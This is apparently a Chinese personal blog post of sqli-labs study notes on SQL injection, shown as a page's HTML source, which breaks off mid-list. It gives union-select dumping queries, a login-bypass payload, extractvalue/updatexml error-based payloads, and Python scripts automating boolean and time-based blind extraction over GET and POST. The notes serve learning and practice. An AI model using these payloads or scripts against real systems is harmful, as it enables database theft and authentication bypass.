@@ -1,0 +1,625 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"flat"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="简介 什么是sql注入:所谓的sql注入就是通过构造“恶意”的代码,让服务器把提交的数据当做sql语句进行执行,从而查询到想要的信息  注入的分类注入大致可以分为按照查询字段  1.字符型   2.数字型(整形)按照注入方法  1.Union注入  2.报错注入  3.布尔盲注  4.时间盲注  什么是注入点注入点就是数据库连接访问的地方,例如URL栏,或是页面提供的表单等如果这个地方会把用户输入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入的学习">
+<meta property="og:url" content="http://example.com/2023/03/26/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="睡猫的博客">
+<meta property="og:description" content="简介 什么是sql注入:所谓的sql注入就是通过构造“恶意”的代码,让服务器把提交的数据当做sql语句进行执行,从而查询到想要的信息  注入的分类注入大致可以分为按照查询字段  1.字符型   2.数字型(整形)按照注入方法  1.Union注入  2.报错注入  3.布尔盲注  4.时间盲注  什么是注入点注入点就是数据库连接访问的地方,例如URL栏,或是页面提供的表单等如果这个地方会把用户输入">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230330204747.png">
+<meta property="article:published_time" content="2023-03-26T07:33:14.000Z">
+<meta property="article:modified_time" content="2023-04-14T13:57:38.763Z">
+<meta property="article:author" content="？？喵！！">
+<meta property="article:tag" content="SQL">
+<meta property="article:tag" content="Hacker">
+<meta property="article:tag" content="sqli-labs">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230330204747.png">
+
+<link rel="canonical" href="http://example.com/2023/03/26/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>SQL注入的学习 | 睡猫的博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">睡猫的博客</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">分享代码，记录生活</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/26/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/hearder.jpg">
+      <meta itemprop="name" content="？？喵！！">
+      <meta itemprop="description" content="瞄一下学过代码，写一个睡喵的博客">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="睡猫的博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SQL注入的学习
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-03-26 15:33:14" itemprop="dateCreated datePublished" datetime="2023-03-26T15:33:14+08:00">2023-03-26</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-04-14 21:57:38" itemprop="dateModified" datetime="2023-04-14T21:57:38+08:00">2023-04-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Hacker/" itemprop="url" rel="index"><span itemprop="name">Hacker</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>6.3k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>22 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><ol>
+<li><p><strong>什么是sql注入</strong>:<br>所谓的sql注入就是通过构造“恶意”的代码,让服务器把提交的数据当做sql语句进行执行,从而查询到想要的信息</p>
+</li>
+<li><p><strong>注入的分类</strong><br>注入大致可以分为<br>按照查询字段  1.<strong>字符型</strong>   2.<strong>数字型(整形)</strong><br>按照注入方法  1.<strong>Union注入</strong>  2.<strong>报错注入</strong>  3.<strong>布尔盲注</strong>  4.<strong>时间盲注</strong></p>
+</li>
+<li><p><strong>什么是注入点</strong><br>注入点就是数据库连接访问的地方,例如URL栏,或是页面提供的表单等<br>如果这个地方会把用户输入的数据误解成SQL语法,则认为这个地方是注入点<br>例如:输入<code>&#39;</code>判断是否存在注入点,报错则说明把<code>&#39;</code>当成代码,存在注入点</p>
+</li>
+<li><p><strong>闭合</strong></p>
+<ol>
+<li><strong>闭合符</strong><br><code>&#39;</code>  <code>&quot;</code>  <code>&#39;)</code>  <code>&quot;)</code>等</li>
+<li><strong>闭合方式判断</strong><br>在语句上加入闭合符,如果页面产生错误,再加上注释符(<code>--+</code>,<code>#</code>,<code>%23</code>)页面又恢复正常,则证明这是该语句的闭合符</li>
+<li><strong>闭合的作用</strong><br>手工闭合前一段查询语句,后面加入其他语句,查询需要的参数,不需要的语句可以用注释符注释</li>
+</ol>
+</li>
+</ol>
+<h1 id="GET提交注入"><a href="#GET提交注入" class="headerlink" title="GET提交注入"></a>GET提交注入</h1><h2 id="字符型与整数型注入的判断"><a href="#字符型与整数型注入的判断" class="headerlink" title="字符型与整数型注入的判断"></a>字符型与整数型注入的判断</h2><p><strong>原理</strong>:字符型需要闭合,两端会有闭合符单引号<code>&#39;&#39;</code>,而数字型不需要闭合符,两种不同类型会把输入的数字与符号理解成不同含义</p>
+<ol>
+<li><code>and 1=1</code>和<code>and 1=2</code><br>如果是数字型,<code>and 1=2</code>时,逻辑错误,页面报错(或无回显),而如果为字符类型,and不会被解析成逻辑判断,只读取第一个字符,不会报错</li>
+<li><strong>减法2-1</strong><br>原理: 有回显的情况下,如果是整数型则会做减法,返回2-1的结果1,如果是字符型只会读取第一个字符2</li>
+</ol>
+<h2 id="列数的判断"><a href="#列数的判断" class="headerlink" title="列数的判断"></a>列数的判断</h2><p>可以利用<code>group by 列数</code>或<code>order by 列数</code>,如果找不到对应列数就会报错,利用二分法快速判断总列数</p>
+<h2 id="Union查询"><a href="#Union查询" class="headerlink" title="Union查询"></a>Union查询</h2><ol start="0">
+<li><p><strong>联合查询特性</strong><br>union查询会临时打印一张虚拟的表,会将新创建的虚拟表中的数据也加入数据库,有时可以根据这个特性,将账号密码加入数据库,然后登入<br>可以在不知道密码的情况下绕过密码登入<br>例如<code>name=1&#39;union select 1,&#39;admin&#39;,&#39;202cb962ac59075b964b07152d234b70&#39;#&amp;pw=123</code>  ps:密码常用md5的方式加密</p>
+</li>
+<li><p><strong>原理</strong><br>利用Union查询,闭合前一句查询语句,然后可以在原本的查询语句后面加入想要的查询语句,但由于Union联合查询的前提 必须有回显,必须列数与类型一致.</p>
+</li>
+<li><p><strong>改变回显位置</strong><br>有时页面只能显示一个内容,第二句内容不显示,可以把原本的第一句内容改为数据库不存在的数据(如<code>id=-1</code>),从而使页面回显想要的内容</p>
+</li>
+<li><p><strong>关键数据库</strong><br><code>information_schema</code>这个数据库里有两张关键的数据表</p>
+<ol>
+<li><code>tables</code>  是所有表名的集合<br>  tables里的<code>table_name</code>字段储存的是表名,<code>table_schema</code>字段储存的是表所在的数据库</li>
+<li><code>columns</code>  是所有字段的集合<br>  columns里的<code>column_name</code>字段储存的是字段名</li>
+</ol>
+</li>
+<li><p><strong>group_concat()</strong><br>确保所有的信息能放在一行显示出来,但是有时显示位不够时,group_concat()可能会显示不全,这时候建议使用limit分页查询</p>
+</li>
+<li><p><strong>爆破当前数据库名</strong></p>
+<ol>
+<li><strong>查询当前数据库</strong><br><code>union select database()</code>  无限定条件</li>
+<li><strong>查询所有数据库</strong><br><code>union select 1,group_concat(SCHEMA_NAME) from information_schema.SCHEMATA</code><br>注意:有些时候flag会放在别的数据库</li>
+</ol>
+</li>
+<li><p><strong>爆破表名</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br></pre></td></tr></table></figure>
+<p>–限定条件一个,为当前所在的库</p>
+</li>
+<li><p><strong>爆破字段名</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;上一步爆破出来的表名&#x27;</span> </span><br></pre></td></tr></table></figure>
+<p>–限定条件两个,1.为当前所在的库,2.上一步爆破出的表名<br>–更新,似乎不要第一个条件也可以,这样可以省略中间的and</p>
+</li>
+<li><p><strong>获取数据</strong><br><code>union select group_concat(爆破字段1,爆破字段2) from 爆破出来的表名</code></p>
+</li>
+</ol>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><ol>
+<li><p><strong>原理</strong><br>前段页面不区别的直接将输入内容拼接成SQL语句,后端执行后也无差别的将结果显示到页面上.<br>构造语句,让错误信息中夹杂可以查询数据内容的查询语句,让返回的错误提示中包含数据库的内容.适用于无回显有报错的情况</p>
+</li>
+<li><p><strong>extractvalue报错</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>extractvalue(<span class="number">100</span>,concat(<span class="number">0x7e</span>,(查询内容)))</span><br></pre></td></tr></table></figure>
+<ol>
+<li>原理:<br> <code>extractvalue()</code>函数的报错是会把报错地址回显出来,利用在extractvalue地址语句中插入sql查询语句,让报错提示把想要的信息回显,<code>(查询语句)</code>中写入对应的查询语句即可</li>
+<li>注意:<br> 100的位置可以随意写,只要不存在的列名会报错即可,<code>concat(参数1,参数2)</code>的作用是将逗号两边的内容拼接起来,而<code>0x7e</code>代表的是字符<code>~</code>,这是extractvalue回显的关键</li>
+<li><code>substring(参数1,参数2,参数3)</code>控制输出 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>extractvalue(<span class="number">100</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="built_in">substring</span>( group_concat(爆破字段<span class="number">1</span>,爆破字段<span class="number">2</span>),<span class="number">1</span>,<span class="number">30</span>)<span class="keyword">from</span> 爆破出的表名 )))</span><br></pre></td></tr></table></figure>
+ 使用原因:extractvalue报错注入默认只能返回三十二个字符,有时无法获取整个数据<br> 用法:参数1是需要查看的数据,参数2是从第几个字符开始看,参数3是看几个字符<br> 当然,这边也可以使用limit,不使用subtring+group_concat <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>extractvalue(<span class="number">100</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> password <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span> )))</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+<li><p><strong>updatexml报错</strong></p>
+<ol>
+<li><code>updatexml(1,concat(0x7e,(查询内容)),3)</code><br>updatexml在报错注入方面和extractvalue几乎没有差别,只是地址参数变成了第二个,</li>
+</ol>
+</li>
+<li><p><strong>floor报错</strong><br>暂略</p>
+</li>
+</ol>
+<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><ol>
+<li><strong>原理</strong> :适用于页面无回显也无报错,但是页面有真假的区别的情况</li>
+<li><strong>基本格式</strong><br><code>and ascii (substr((查询语句),1,1))&gt;100 --+</code></li>
+<li><code>ascii()</code><br>通过ascii()将查询的数据转为ascii码判断真假,为真,最后结果为1,为假,最后结果为0</li>
+<li><code>substring(参数1,参数2,参数3)</code>控制输出<br>参数1是需要查看的数据,参数2是从第几个字符开始看(从一开始每次加一),参数3是看几个字符(每次一个)</li>
+<li><strong>二分法脚本</strong>:<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;查询网址&#x27;</span></span><br><span class="line">table = <span class="string">&quot;&quot;</span>    <span class="comment">#储存数据</span></span><br><span class="line">flag =<span class="string">&quot;真值条件&quot;</span></span><br><span class="line">bihe=<span class="string">&quot;?id=1&#x27;&quot;</span>   <span class="comment">#闭合方式</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    left = <span class="number">31</span></span><br><span class="line">    right = <span class="number">128</span></span><br><span class="line">    mid = (left + right) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span>(left&lt;right):</span><br><span class="line">        payload = <span class="string">f&quot;and ascii (substr((查询语句),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span> --+&quot;</span></span><br><span class="line">        new_url = url +bihe+ payload</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> requests.get(url=new_url).text:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right=mid</span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line">    table= table + <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(table)</span><br></pre></td></tr></table></figure>
+注意点:<code>二分法(&lt;,&gt;,+1)</code>, <code>mid = (left + right) // 2</code>要写两个,其中一个在最后<br><strong>另一种写法的二分法</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  requests</span><br><span class="line">url=<span class="string">&#x27;&#x27;</span></span><br><span class="line">table=<span class="string">&quot;&quot;</span></span><br><span class="line">bihe=<span class="string">&quot;?id=1&#x27;&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    left=<span class="number">31</span></span><br><span class="line">    right=<span class="number">128</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line">        pyload=<span class="string">f&quot;and ascii(substr((select database()),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span> --+&quot;</span></span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> requests.get(url=url+bihe+pyload).text:</span><br><span class="line">            left=mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> left==right:</span><br><span class="line">            table += <span class="built_in">chr</span>(mid)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right=mid</span><br><span class="line"><span class="built_in">print</span>(table)</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><ol>
+<li><strong>原理</strong>:<br>适用于页面有注入点,可以把输入内容当做代码执行,但是既没有回显也无报错,甚至无法区别真假。这是可以利用<code>sleep()</code>函数测试,如果页面出现延迟,则说明存在注入点</li>
+<li><strong>关键函数</strong><code>if(参数1,参数2,参数3)</code><br>这是SQL的if语法,参数1作为判断,若为真,则返回参数2,若为假,则返回参数三</li>
+<li><strong>基本格式</strong><br><code>and if(ascii (substr((查询语句),1,1))&gt;100,sleep(2),0)--+</code></li>
+<li><strong>时间盲注脚本</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&#x27;查询地址&#x27;</span></span><br><span class="line">table = <span class="string">&quot;&quot;</span>    <span class="comment">#储存数据</span></span><br><span class="line">bihe=<span class="string">&quot;?id=1&#x27;&quot;</span>   <span class="comment">#闭合方式</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    left = <span class="number">31</span></span><br><span class="line">    right = <span class="number">128</span></span><br><span class="line">    mid = (left + right) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span>(left&lt;right):</span><br><span class="line">        payload = <span class="string">f&quot;and if(ascii (substr((查询语句),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(2),0)--+&quot;</span></span><br><span class="line">        new_url = url +bihe+ payload</span><br><span class="line">        start=time.time()</span><br><span class="line">        requests.get(url=new_url)</span><br><span class="line">        end=time.time()</span><br><span class="line">        <span class="keyword">if</span> end-start&gt;=<span class="number">2</span>:  <span class="comment">#注意,这里要判断基本延迟</span></span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right=mid</span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line">    table= table + <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(table)</span><br></pre></td></tr></table></figure>
+<strong>注意</strong>:基本框架和布尔盲注类似,只要将布尔盲注的真值判断改为时间差即可(当然sql语句也要改),但脚本请求有基本的延迟,需要先判断基本延迟,如果特别卡可以把<code>sleep()</code>的时间改小一点<br><strong>延迟判断</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">start=time.time()</span><br><span class="line">requests.get(url=new_url)</span><br><span class="line">end=time.time()</span><br></pre></td></tr></table></figure>
+在这段语句后面加上一个<code>print(end-start)</code>即可,会不断跳出来数字,偏大的即为成功执行sleep</li>
+</ol>
+<h2 id="文件上传注入"><a href="#文件上传注入" class="headerlink" title="文件上传注入"></a>文件上传注入</h2><p>暂略</p>
+<h2 id="and和or"><a href="#and和or" class="headerlink" title="and和or"></a>and和or</h2><pre><code>如果要实现布尔盲注(需要页面有真假值的反馈),如果使用and,必须保证前半段语句是正确的,如果使用or,则必须保证前半段语句是错误的
+</code></pre>
+<h1 id="POST提交注入"><a href="#POST提交注入" class="headerlink" title="POST提交注入"></a>POST提交注入</h1><p>post提交和get提交的主要区别就是,post提交相对get提交更安全一些,一般的表单等密码输入都是采用post提交</p>
+<h2 id="post提交的闭合判断"><a href="#post提交的闭合判断" class="headerlink" title="post提交的闭合判断"></a>post提交的闭合判断</h2><p>若输入闭合符导致页面报错(或不显示),加上<code>or 1=1 #</code>后可以成功登入,则说明存在注入点,且闭合符为输入闭合符</p>
+<h2 id="时间盲注-1"><a href="#时间盲注-1" class="headerlink" title="时间盲注"></a>时间盲注</h2><ol>
+<li><strong>原理</strong><br>post提交在手动注入上和get没有什么区别,但是在python脚本里,get提交是利用字符串的拼接来实现对网址的传参,而post提交则要利用字典</li>
+<li><strong>二分法脚本</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&#x27;地址&#x27;</span></span><br><span class="line">table = <span class="string">&quot;&quot;</span>  <span class="comment"># 储存数据</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    left = <span class="number">31</span></span><br><span class="line">    right = <span class="number">128</span></span><br><span class="line">    mid = (left + right) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> (left &lt; right):</span><br><span class="line">        date = &#123;</span><br><span class="line">            <span class="string">&quot;uname&quot;</span>: <span class="string">f&quot;1&#x27; or if(ascii (substr((查询语句),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(2),0) #&quot;</span>,  <span class="comment">#post要提交的数据</span></span><br><span class="line">            <span class="string">&quot;passwd&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;Submit&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        start = time.time()</span><br><span class="line">        requests.post(url=url,data=date)</span><br><span class="line">        end = time.time()</span><br><span class="line">        <span class="keyword">if</span> end - start &gt;=<span class="number">2</span>:  <span class="comment"># 注意,这里要判断基本延迟</span></span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = mid</span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line">    table = table + <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(table)</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="布尔盲注-1"><a href="#布尔盲注-1" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><ol>
+<li><strong>判断条件</strong><br>如果条件是以图片的形式显示的,需要写成<code>相对路径.jpg</code>,例如<code>../images/flag.jpg</code>(两个小数点<code>..</code>表示上一个目录)</li>
